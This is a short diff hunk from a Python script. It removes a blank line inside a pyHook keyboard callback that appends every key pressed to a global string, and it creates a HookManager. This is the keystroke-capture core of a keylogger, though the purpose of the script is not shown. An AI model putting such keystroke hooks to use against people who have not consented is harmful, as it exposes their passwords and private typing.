@@ -14,7 +14,6 @@ def keypressed(event):
     global string
     
     string += str(event.GetKey())
-
     return True 
 
 obj = pyHook.HookManager()
